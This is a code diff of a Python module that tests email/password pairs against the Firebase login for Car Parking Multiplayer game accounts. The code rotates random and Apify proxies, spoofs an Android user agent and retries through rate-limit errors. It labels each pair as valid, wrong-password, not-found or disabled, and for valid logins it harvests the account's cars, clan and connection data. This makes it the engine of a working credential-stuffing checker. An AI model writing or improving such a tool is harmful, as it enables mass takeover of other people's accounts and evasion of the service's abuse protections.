@@ -1,70 +1,67 @@
 import json
 import asyncio
-from datetime import datetime
-from typing import Optional, Tuple, Dict, Any
 import aiohttp
+from datetime import datetime
+from typing import Tuple, Dict, Any, Optional, List
 
-from config import AUTH_LOGIN_URL, AUTH_LOOKUP_URL, CF_BASE_URL, APIFY_PROXY_URL
+from config import (
+    AUTH_LOGIN_URL,
+    AUTH_LOOKUP_URL,
+    CF_BASE_URL,
+    APIFY_PROXY_URL
+)
 from proxy_manager import proxy_mgr
 
-def format_ts(val):
-    if not val:
+def format_ts(ts_val) -> str:
+    """Unix timestamp veya string tarihi standart formata çevirir."""
+    if not ts_val:
         return "Bilinmiyor"
     try:
-        return datetime.fromtimestamp(int(val) / 1000.0).strftime("%Y-%m-%d %H:%M:%S")
+        val = int(ts_val)
+        if val > 100000000000:
+            val = val / 1000
+        return datetime.fromtimestamp(val).strftime("%Y-%m-%d %H:%M:%S")
     except Exception:
-        return str(val)
-
-# Kesinlikle tekrar denenmeyecek kullanıcı/şifre hataları
-DEFINITE_AUTH_ERRORS = [
-    "INVALID_PASSWORD",
-    "EMAIL_NOT_FOUND",
-    "USER_DISABLED",
-    "INVALID_LOGIN_CREDENTIALS"
-]
+        return str(ts_val)
 
 async def async_http_post(
     session: aiohttp.ClientSession,
     url: str,
-    payload: Optional[dict] = None,
+    payload: dict,
     headers: Optional[dict] = None,
-    timeout: float = 9.0,
+    timeout: float = 8.5,
     proxy: Optional[str] = None
-) -> Tuple[Optional[Any], Optional[str]]:
-    if headers is None:
-        headers = {}
-    if "Content-Type" not in headers:
-        headers["Content-Type"] = "application/json"
+) -> Tuple[Optional[dict], Optional[str]]:
+    """Genel asenkron HTTP POST isteği."""
+    default_headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"
+    }
+    if headers:
+        default_headers.update(headers)
 
-    client_timeout = aiohttp.ClientTimeout(total=timeout)
+    req_proxy = proxy
+    if req_proxy and not (req_proxy.startswith("http://") or req_proxy.startswith("https://") or req_proxy.startswith("socks4://") or req_proxy.startswith("socks5://")):
+        req_proxy = f"http://{req_proxy}"
 
     try:
-        kwargs = {
-            "json": payload or {},
-            "headers": headers,
-            "timeout": client_timeout
-        }
-        if proxy:
-            kwargs["proxy"] = proxy
-
-        async with session.post(url, **kwargs) as resp:
-            body_text = await resp.text()
+        async with session.post(
+            url,
+            json=payload,
+            headers=default_headers,
+            proxy=req_proxy,
+            timeout=aiohttp.ClientTimeout(total=timeout)
+        ) as resp:
+            text = await resp.text()
             try:
-                data = json.loads(body_text)
+                data = json.loads(text)
             except Exception:
-                data = body_text
-
-            if resp.status == 200:
-                return data, None
-            else:
-                err_msg = "Bilinmeyen Hata"
-                if isinstance(data, dict) and "error" in data:
-                    err_msg = data["error"].get("message", str(data["error"]))
-                elif isinstance(data, str):
-                    err_msg = data
-                return None, err_msg
+                data = {"raw_text": text}
+            return data, None
     except asyncio.TimeoutError:
-        return None, "Zaman Aşımı (Timeout)"
+        return None, "İstek Zaman Aşımına Uğradı (Timeout)"
+    except aiohttp.ClientProxyConnectionError:
+        return None, "Proxy Bağlantı Hatası"
     except Exception as e:
         return None, str(e)
 
@@ -76,6 +73,7 @@ async def fetch_cpm_account_details(
     uid: str,
     proxy: Optional[str] = None
 ) -> Dict[str, Any]:
+    """Firebase doğrulanmış hesabın tüm CPM oyun içi detaylarını paralel çeker."""
     details = {
         "email": email,
         "password": password,
@@ -100,7 +98,6 @@ async def fetch_cpm_account_details(
         "Authorization": f"Bearer {id_token}"
     }
 
-    # 5 alt isteği paralel asenkron olarak sorgula (8 saniye toleransla)
     tasks = [
         async_http_post(session, AUTH_LOOKUP_URL, {"idToken": id_token}, timeout=8.0, proxy=proxy),
         async_http_post(session, f"{CF_BASE_URL}/GetUserConnectionData2", {"data": {}}, cf_headers, timeout=8.0, proxy=proxy),
@@ -158,88 +155,100 @@ async def fetch_cpm_account_details(
         try:
             raw_cars = json.loads(cars_res["result"]) if isinstance(cars_res["result"], str) else cars_res["result"]
             if isinstance(raw_cars, list):
-                custom_ids = [car.get("CarID") for car in raw_cars if isinstance(car, dict) and "CarID" in car]
+                custom_ids = []
+                for car in raw_cars:
+                    if isinstance(car, dict) and "carId" in car:
+                        custom_ids.append(car["carId"])
                 details["cpm_custom_cars"] = len(custom_ids)
                 details["cpm_custom_ids"] = custom_ids
-                details["cpm_cars"] = custom_ids
+                details["cpm_cars"] = raw_cars
         except Exception:
             pass
 
-    details["cpm_total_cars"] = max(details.get("cpm_unlocked_cars", 0), details.get("cpm_custom_cars", 0))
-
-    # 5. Klan
+    # 5. Klan ID
     if clan_res and isinstance(clan_res, dict) and "result" in clan_res:
-        details["cpm_clan_id"] = str(clan_res.get("result") or "").strip() or None
+        try:
+            cl_data = json.loads(clan_res["result"]) if isinstance(clan_res["result"], str) else clan_res["result"]
+            if isinstance(cl_data, dict):
+                details["cpm_clan_id"] = cl_data.get("clanId")
+            elif isinstance(cl_data, str) and cl_data:
+                details["cpm_clan_id"] = cl_data
+        except Exception:
+            pass
 
+    details["cpm_total_cars"] = max(details["cpm_unlocked_cars"], details["cpm_custom_cars"])
     return details
 
 async def check_cpm_account(
     session: aiohttp.ClientSession,
     email: str,
     password: str,
-    max_retries: int = 4
-) -> Tuple[bool, Dict[str, Any], Optional[str]]:
+    proxy: Optional[str] = None
+) -> Tuple[bool, Optional[Dict[str, Any]], Optional[str]]:
     """
-    Ultra Hassas Hesap Kontrol Motoru:
-    1. Havuzdan farklı proxylerle 3 deneme yapar.
-    2. Eğer proxyler sürekli zaman aşımına uğrarsa 4. denemede doğrudan/Apify fallback yapar.
-    3. Gerçek şifre/kullanıcı hatalarında tek seferde sonlanır.
+    Akıllı 4 Kademeli Retry Motoru ile CPM hesabını test eder.
+    Kesin kimlik doğrulama hatalarında derhal çıkar, proxy aksaklıklarında otomatik yeniden dener.
     """
-    email = email.strip()
-    password = password.strip()
-
-    payload = {
-        "email": email,
-        "password": password,
+    login_payload = {
+        "email": email.strip(),
+        "password": password.strip(),
         "returnSecureToken": True
     }
 
+    max_attempts = 4
     last_err = "Bilinmeyen Hata"
 
-    for attempt in range(max_retries):
-        # Son denemede proxy düşerse doğrudan veya Apify ile kurtar
-        if attempt == max_retries - 1 and APIFY_PROXY_URL:
-            current_proxy = APIFY_PROXY_URL
-        elif attempt == max_retries - 1:
-            current_proxy = None # Doğrudan son şans denemesi
+    for attempt in range(1, max_attempts + 1):
+        if attempt == 1:
+            current_proxy = proxy if proxy else proxy_mgr.get_random_proxy()
+        elif attempt == 2:
+            current_proxy = proxy_mgr.get_random_proxy()
+        elif attempt == 3:
+            current_proxy = APIFY_PROXY_URL if APIFY_PROXY_URL else proxy_mgr.get_random_proxy()
         else:
-            current_proxy = proxy_mgr.get_proxy()
+            current_proxy = None  # Son denemede doğrudan temiz bağlantı
 
-        res, err = await async_http_post(
+        data, err = await async_http_post(
             session=session,
             url=AUTH_LOGIN_URL,
-            payload=payload,
+            payload=login_payload,
             timeout=8.5,
             proxy=current_proxy
         )
 
-        if res and isinstance(res, dict) and "idToken" in res:
-            uid = res.get("localId", "")
-            id_token = res["idToken"]
+        if err:
+            last_err = err
+            await asyncio.sleep(0.3)
+            continue
+
+        if not data:
+            last_err = "Yanıt Alınamadı"
+            await asyncio.sleep(0.3)
+            continue
+
+        # Başarılı Giriş
+        if "idToken" in data and "localId" in data:
+            id_token = data["idToken"]
+            uid = data["localId"]
             details = await fetch_cpm_account_details(session, email, password, id_token, uid, proxy=current_proxy)
-            details["refreshToken"] = res.get("refreshToken")
             return True, details, None
 
-        last_err = err or "Giriş Başarısız"
+        # Kesin Firebase Kimlik Hataları
+        if "error" in data and isinstance(data["error"], dict):
+            msg = data["error"].get("message", "UNKNOWN_ERROR")
+            if "INVALID_PASSWORD" in msg or "INVALID_LOGIN_CREDENTIALS" in msg:
+                return False, None, "Hatalı Şifre"
+            elif "EMAIL_NOT_FOUND" in msg:
+                return False, None, "Hesap Bulunamadı"
+            elif "USER_DISABLED" in msg:
+                return False, None, "Hesap Devre Dışı"
+            elif "TOO_MANY_ATTEMPTS_TRY_LATER" in msg:
+                last_err = "Geçici Hız Sınırı (Rate Limit)"
+                await asyncio.sleep(0.5)
+                continue
+            else:
+                return False, None, f"Firebase: {msg}"
 
-        # Eğer hata kesin bir kullanıcı/şifre hatasıysa hemen çık (şifre yanlış veya hesap yok)
-        is_definite_auth_fail = any(auth_err in last_err for auth_err in DEFINITE_AUTH_ERRORS)
-        if is_definite_auth_fail:
-            break
+        last_err = "Bilinmeyen Giriş Hatası"
 
-        # Ağ/Proxy hatasında kısa bekle ve tekrar dene
-        if attempt < max_retries - 1:
-            await asyncio.sleep(0.2)
-
-    # Hata mesajını sadeleştir
-    err_msg = last_err
-    if "INVALID_PASSWORD" in err_msg or "INVALID_LOGIN_CREDENTIALS" in err_msg:
-        err_msg = "Hatalı Şifre"
-    elif "EMAIL_NOT_FOUND" in err_msg:
-        err_msg = "Hesap Bulunamadı"
-    elif "USER_DISABLED" in err_msg:
-        err_msg = "Hesap Devre Dışı"
-    elif "TOO_MANY_ATTEMPTS" in err_msg:
-        err_msg = "Rate Limit (Lütfen Bekleyin veya Proxy Ekleyin)"
-
-    return False, {"email": email, "password": password}, err_msg
+    return False, None, last_err
